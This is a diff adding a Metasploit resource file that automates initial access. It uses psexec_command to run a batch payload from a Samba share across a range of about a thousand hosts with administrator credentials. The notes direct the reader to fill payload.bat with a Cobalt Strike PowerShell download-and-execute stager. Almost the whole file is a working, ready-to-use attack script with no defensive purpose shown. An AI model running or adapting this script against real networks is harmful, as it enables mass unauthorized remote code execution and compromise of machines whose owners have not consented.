@@ -1,0 +1,40 @@
+#################################################
+# Created by @jgaudard
+# Resource file for metasploit
+# Auto exploits with psexec, must setup samba share as written
+# Created: 9 March 2017    Edited: never
+# Version 1.0
+#################################################
+
+
+<ruby>
+#### Don't forget to set your variables ####
+targets = "192.168.1-10.1-100"
+command = "\\share\payload.bat"
+user = "administrator"
+pass = "password"
+threads = "100"
+
+run_single("use auxiliary/admin/smb/psexec_command")
+run_single("set COMMAND #{command}")
+run_single("set RHOSTS #{targets}")
+run_single("set SMBPass #{pass}")
+run_single("set SMBUser #{user}")
+run_single("set THREADS #{threads}")
+run_single("exploit")
+
+</ruby>
+
+
+##############################################
+################ Notes #######################
+# 1. Setup samba share: https://wiki.samba.org/index.php/Setting_up_Samba_as_a_Standalone_Server
+# edit /etc/samba/smb.conf  #add anon part to the bottom after creating a backup
+# 2. create payload.bat
+# add powershell download and execute from cobaltstrike
+# 3. start msfconsole
+# 4. run resource file "resource initial_access.rc"
+##############################################
+
+
+
